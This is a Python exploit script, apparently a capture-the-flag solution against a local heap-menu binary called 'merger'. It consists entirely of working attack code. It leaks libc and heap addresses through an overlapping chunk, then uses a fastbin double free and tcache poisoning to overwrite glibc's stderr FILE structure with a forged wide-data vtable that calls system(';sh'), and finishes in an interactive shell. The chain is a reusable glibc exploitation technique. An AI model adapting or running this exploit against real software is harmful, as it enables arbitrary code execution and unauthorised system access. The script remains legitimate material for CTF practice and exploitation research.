from ptrlib import *
import os
import sys

binary = "./merger_patched" if len(sys.argv) > 1 and '-p' in sys.argv else "./merger"

def add(index, size, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("index: ", str(index))
    sock.sendlineafter("size: ", str(size))
    sock.sendlineafter("data: ", data)
def drop(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("index: ", str(index))
    
def show(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("index: ", str(index))
    return sock.recvline().strip()
def merge(dst, src):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("dst: ", str(dst))
    sock.sendlineafter("src: ", str(src))
    ret = sock.recvline().strip()
    if b'Invalid index' in ret:
        return ret 
    return ret.split(b": ")[1]

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

sock = Process(binary)

for i in range(7):
    add(i, 0xf7, "A"*0xf6)
for i in range(7):
    add(7+i, 0x87, "A"*0x86)
add(30, 0xf7, "D"*0xf6)
add(31, 0x17, "E"*0x16)
for i in range(7):
    drop(i)
drop(30) # make big unsortedbin chunk
add(29, 0x87, "C"*0x86) # make small unsortedbin chunk
for i in range(7):
    add(i, 0xf7, b"A"*0xf6)
for i in range(7):
    drop(7+i)
# Overlap tcache and unsortedbin

leak = merge(29, 29) # 29 goes to both unsortedbin and tcache

libc.base = u64(leak[0x86:]) - libc.main_arena() - 0x60
# Fix unsortedbin
add(29, 0xf7, p64(libc.main_arena() + 0x60)*2) # alloc from tcache
add(30, 0x77, b"0"*0x76)
# Fill tcache
for i in range(8):
    add(7+i, 0x77, b"A"*0x76)
for i in range(7):
    drop(7+i)
# Prepare target
for i in range(3):
    add(i, 0xf7, b"A"*0xf6)
for i in range(3):
    drop(i)
# Double free
drop(30) # fastbin
heap_base = u64(show(29)) << 12
logger.info("heap = " + hex(heap_base))

drop(14)
drop(29) # double free on fastbin
for i in range(7):
    add(7+i, 0x77, b"A"*0x76)
add(29, 0x77, p64((heap_base + 0x1550) ^ (heap_base >> 12)))
# tcache poisoning
add(14, 0x77, b"A"*0x76)
add(30, 0x77, b"A"*0x76)
add(31, 0x77, p64(libc.symbol("_IO_2_1_stderr_") ^ ((heap_base + 0x1000) >> 12)))
# Corrupt FILE
payload  = p32(0xfbad0101) + b";sh\0" # fp->_flags & _IO_UNBUFFERED == 0)
payload += b"\x00" * (0x58 - len(payload))
payload += p64(libc.symbol("system")) # vtable->iowalloc
payload += b"\x00" * (0x88 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # _wide_data (1)
payload += b"\x00" * (0xa0 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # _wide_data (1)
payload += b"\x00" * (0xc0 - len(payload))
payload += p32(1) # fp->_mode != 0
payload += b"\x00" * (0xd0 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # (1) _wide_data->vtable
payload += p64(libc.symbol("_IO_wfile_jumps") + 0x18 - 0x58) # _IO_wfile_jumps + delta
payload += p64(0xfbad2887)
add(0, 0xf7, b"neko")
add(1, 0xf7, payload)
sock.sendlineafter("> ", "1")
sock.sendlineafter(": ", "-1")
sock.interactive()